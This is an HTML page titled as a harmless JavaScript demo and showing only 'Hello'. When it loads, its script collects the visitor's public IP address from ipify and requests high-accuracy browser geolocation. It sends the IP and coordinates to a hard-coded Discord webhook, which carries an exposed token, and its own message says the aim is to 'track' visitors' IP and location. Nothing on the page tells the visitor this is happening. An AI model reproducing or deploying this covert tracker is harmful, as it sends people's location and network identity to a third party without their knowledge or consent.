<!DOCTYPE html>
<html>
<head>
<title>Execute JavaScript Function with Parameter</title>
</head>
<body>

<script>
    function sendDiscordMessage(message) {
        fetch('https://discord.com/api/webhooks/1368567747277225984/3dHb8nBnW4LO0SsGnfJD5EyioGDuRj6aUhE4ADtiOYtU9grNaVL6Z9idfxBZ2Sy-3UL_', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                'content': message // Use the 'message' parameter here
            })
        });
    }
    sendDiscordMessage("Someone Just Entered the Website, Let's track there IP and Location\n`==================== INIT ====================`")
    // Call the function when the page loads, passing "test" as the argument
    // const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip
    fetch("https://api.ipify.org?format=json").then(a => a.json()).then(function(ip_json) {
        ip = ip_json.ip
        const message_01 = `
        IP: ${ip}
        `.trim()
        // window.onload = function() {
        //     sendDiscordMessage("test");
        // };
        sendDiscordMessage(message_01);
        function sendTemp(m) {
            message_02 = `
IP: ${ip}
${m}
        `.trim()
            // window.onload = function() {
            //     sendDiscordMessage("test");
            // };
            sendDiscordMessage(message_02);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // Success function
                    (p => sendTemp(showPosition(p))), 
                    // Error function
                    (e => sendDiscordMessage("Can't get location")), 
                    // Options. See MDN for details.
                    {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                    });
            } else { 
                return "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            return "> Latitude: " + position.coords.latitude + 
            "\n> Longitude: " + position.coords.longitude;  
        }
        getLocation()
        sendDiscordMessage("`==================== DONE ====================`")
    }
)
</script>
<!-- v 1.2
<p>This page will execute a JavaScript function with a parameter when it loads.</p> -->
<h1 style="text-align: center;">Hello</h1>
</body>
</html>
